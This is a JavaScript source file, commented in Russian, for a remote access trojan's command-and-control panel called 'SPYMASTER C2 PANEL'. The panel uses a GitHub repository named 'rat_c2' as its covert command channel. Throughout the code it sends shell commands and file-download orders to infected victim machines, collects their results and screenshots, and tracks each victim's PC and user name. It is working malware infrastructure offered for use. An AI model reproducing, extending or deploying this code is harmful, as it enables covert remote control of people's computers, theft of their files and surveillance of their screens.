// ============= SPYMASTER C2 PANEL - СТАБИЛЬНАЯ ВЕРСИЯ =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

// ============= КОНФИГУРАЦИЯ =============
let GITHUB_USERNAME = "gitnikaaaa";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Загрузка сохранённых данных
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
    }
} catch(e) {}

if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB:");
        if (GITHUB_TOKEN) localStorage.setItem("github_token", GITHUB_TOKEN);
    }
}

if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ LOGIN GITHUB:");
        if (GITHUB_USERNAME) localStorage.setItem("github_username", GITHUB_USERNAME);
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

let clients = [];
let seenFiles = [];
let autoRefresh = null;
let currentClient = "all";

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ КОМАНД =============
async function sendCommand(command, clientId = null) {
    if (!command) return;
    
    const targetClient = clientId || currentClient || "all";
    let finalCommand = command;
    if (targetClient !== "all") {
        finalCommand = `@${targetClient} ${command}`;
    }
    
    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
    showSendingIndicator(true);
    
    try {
        // Отключаем кэширование
        const cacheBuster = `?t=${Date.now()}&_=${Math.random()}`;
        
        // Получаем текущий commands.txt с актуальным SHA
        let response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
            headers: HEADERS,
            cache: 'no-store'
        });
        
        let currentContent = "";
        let sha = null;
        
        if (response.status === 200) {
            const data = await response.json();
            currentContent = atob(data.content);
            sha = data.sha;
            addLog(`📖 ТЕКУЩИЙ SHA: ${sha.substring(0, 8)}...`, "system");
        } else if (response.status === 404) {
            addLog(`📝 ФАЙЛ commands.txt НЕ СУЩЕСТВУЕТ, СОЗДАЮ...`, "system");
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            showSendingIndicator(false);
            return;
        }
        
        // Добавляем команду с временной меткой
        const newContent = currentContent + finalCommand + " #" + Date.now() + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        // Отправляем с повторными попытками
        let success = false;
        for (let attempt = 1; attempt <= 3; attempt++) {
            try {
                const putResponse = await fetch(`${API_URL}/commands.txt`, {
                    method: "PUT",
                    headers: HEADERS,
                    body: JSON.stringify(putData)
                });
                
                if (putResponse.status === 200 || putResponse.status === 201) {
                    addLog(`✅ КОМАНДА ОТПРАВЛЕНА! (попытка ${attempt})`, "success");
                    showNotification(`✅ Команда отправлена: ${command}`, "success");
                    success = true;
                    break;
                } else if (putResponse.status === 409) {
                    addLog(`⚠️ КОНФЛИКТ (409), ОБНОВЛЯЮ SHA... (попытка ${attempt})`, "warning");
                    // Получаем свежий SHA
                    const freshResponse = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
                        headers: HEADERS,
                        cache: 'no-store'
                    });
                    if (freshResponse.status === 200) {
                        const freshData = await freshResponse.json();
                        putData.sha = freshData.sha;
                        continue;
                    }
                } else {
                    addLog(`❌ ОШИБКА: ${putResponse.status} (попытка ${attempt})`, "error");
                }
            } catch (err) {
                addLog(`⚠️ ОШИБКА: ${err.message} (попытка ${attempt})`, "error");
            }
            
            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
        }
        
        if (!success) {
            addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ КОМАНДУ ПОСЛЕ 3 ПОПЫТОК`, "error");
            showNotification(`❌ Ошибка отправки: ${command}`, "error");
        }
        
    } catch (error) {
        addLog(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, "error");
        showNotification(`❌ Ошибка: ${error.message}`, "error");
    }
    
    showSendingIndicator(false);
}

// ============= ИНДИКАТОР ОТПРАВКИ =============
function showSendingIndicator(show) {
    let indicator = document.getElementById("sendingIndicator");
    if (!indicator) {
        indicator = document.createElement("div");
        indicator.id = "sendingIndicator";
        indicator.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: #ff8800;
            color: #fff;
            padding: 8px 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            z-index: 1000;
            display: none;
        `;
        indicator.innerHTML = "⏳ ОТПРАВКА...";
        document.body.appendChild(indicator);
    }
    indicator.style.display = show ? "block" : "none";
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const cacheBuster = `?t=${Date.now()}`;
        const response = await fetch(`${API_URL}${cacheBuster}`, { headers: HEADERS });
        if (!response.ok) return;
        
        const files = await response.json();
        if (!Array.isArray(files)) return;
        
        const results = files.filter(f => f.name.startsWith("result_"));
        const screenshots = files.filter(f => f.name.startsWith("screenshot_"));
        
        document.getElementById("resultsCount").innerText = results.length;
        document.getElementById("screensCount").innerText = screenshots.length;
        document.getElementById("clientsCount").innerText = clients.length;
        
        // Обрабатываем новые результаты
        for (const file of results) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                const content = await fetch(file.download_url + cacheBuster).then(r => r.text());
                addLog(`📥 ${file.name}`, "result");
                const lines = content.split('\n').slice(0, 5);
                for (const line of lines) {
                    if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
                }
                
                // Парсим нового клиента
                if (content.includes("PC:")) {
                    const pcMatch = content.match(/PC:\s*([^\n]+)/);
                    const userMatch = content.match(/User:\s*([^\n]+)/);
                    if (pcMatch && !clients.find(c => c.id === pcMatch[1])) {
                        clients.push({
                            id: pcMatch[1],
                            user: userMatch ? userMatch[1] : "Unknown",
                            firstSeen: new Date().toLocaleString()
                        });
                        updateClientsList();
                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${pcMatch[1]}`, "client");
                    }
                }
            }
        }
        
        // Обновляем скриншоты
        const grid = document.getElementById("screensGrid");
        if (grid && screenshots.length > 0) {
            grid.innerHTML = "";
            for (const shot of screenshots.slice(-6).reverse()) {
                const card = document.createElement("div");
                card.className = "screenshot-card";
                card.onclick = () => window.open(shot.download_url, '_blank');
                card.innerHTML = `<img src="${shot.download_url}${cacheBuster}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
                grid.appendChild(card);
            }
        }
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

function updateClientsList() {
    const select = document.getElementById("clientSelect");
    if (!select) return;
    select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
    for (const client of clients) {
        select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
    }
}

async function clearCommands() {
    try {
        const cacheBuster = `?t=${Date.now()}`;
        const response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, { headers: HEADERS });
        if (response.status === 200) {
            const data = await response.json();
            const deleteData = {
                message: "Clear commands",
                content: btoa(""),
                sha: data.sha,
                branch: "main"
            };
            await fetch(`${API_URL}/commands.txt`, {
                method: "PUT",
                headers: HEADERS,
                body: JSON.stringify(deleteData)
            });
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

async function testConnection() {
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system");
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        if (response.ok) {
            const user = await response.json();
            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            document.getElementById("statusIndicator").classList.add("online");
            document.getElementById("statusText").innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
        return false;
    }
}

function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => loadResults(), 8000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (8 сек)", "system");
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
async function init() {
    addLog("🐀 SPYMASTER C2 PANEL v5.0", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    
    // Добавляем стили
    if (!document.querySelector("#dynamic-styles")) {
        const style = document.createElement('style');
        style.id = "dynamic-styles";
        style.textContent = `
            @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
            .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
            .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
            .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
            .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
            .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
            .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
        `;
        document.head.appendChild(style);
    }
    
    await testConnection();
    startAutoRefresh();
    await loadResults();
    
    // Привязываем кнопки
    document.querySelectorAll(".cmd-btn, .cmd-small").forEach(btn => {
        if (btn.id !== "sendCustomBtn" && btn.id !== "downloadBtn" && btn.id !== "shellBtn") {
            btn.addEventListener("click", () => {
                const cmd = btn.getAttribute("data-cmd");
                if (cmd) sendCommand(cmd);
            });
        }
    });
    
    document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
        const cmd = document.getElementById("customCmd")?.value;
        if (cmd) sendCommand(cmd);
        if (document.getElementById("customCmd")) document.getElementById("customCmd").value = "";
    });
    
    document.getElementById("downloadBtn")?.addEventListener("click", () => {
        const path = document.getElementById("downloadPath")?.value;
        if (path) sendCommand(`/download ${path}`);
    });
    
    document.getElementById("shellBtn")?.addEventListener("click", () => {
        const cmd = document.getElementById("shellCmd")?.value;
        if (cmd) sendCommand(`/cmd ${cmd}`);
    });
    
    document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
    document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults());
    
    document.getElementById("clientSelect")?.addEventListener("change", (e) => {
        currentClient = e.target.value;
        addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
    });
}

// Запуск
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}
